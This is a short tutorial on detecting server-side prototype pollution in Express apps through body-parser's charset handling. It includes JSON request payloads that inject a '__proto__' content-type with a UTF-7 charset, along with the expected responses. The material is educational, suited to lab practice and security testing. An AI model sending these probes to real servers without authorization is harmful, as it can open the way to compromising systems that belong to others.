# Charset Override

Express servers use middleware to process requests before passing them to handlers. The **body-parser** module, for example, parses request bodies and creates `req.body`.

```js
var charset = getCharset(req) || 'utf-8' 

function getCharset (req) { 
	try { 
		return (contentType.parse(req).parameters.charset || '').toLowerCase() 
	} catch (e) {
		return undefined 
	}
} 
read(req, res, next, parse, debug, { 
	encoding: charset, 
	inflate: inflate, 
	limit: limit, 
	verify: verify 
})
```

In the code above, `getCharset(req)` attempts to parse the `Content-Type` header to determine the character encoding. If **no charset** is defined, it falls back to an empty string (`''`). This value is then passed to `read()` as an **encoding option**, defaulting to `'utf-8'`.

Since `charset` is an empty string, we can attempt to exploit it using Prototype Pollution by injecting a different/custom encoding.

***

If you can find an object whose properties are visible in a response, you can use this to probe for sources. In the following example, we'll use UTF-7 encoding and a JSON source.

1. Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, `foo` in UTF-7 is `+AGYAbwBv-`.

```json
{  
    "role":"+AGYAbwBv-" 
}
```

2. Send the request. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form.
3. Try to pollute the prototype with a `content-type` property that explicitly specifies the UTF-7 character set:

```json
{ 
	"role":"+AGYAbwBv-", 
	"__proto__":{ 
	"content-type": "application/json; charset=utf-7" 
	} 
}
```

3. Repeat the first request. If you successfully polluted the prototype, the UTF-7 string should now be decoded in the response:

```json
{ 
    "sessionId":"0123456789", 
    "username":"wiener", 
    "role":"foo" 
}
```
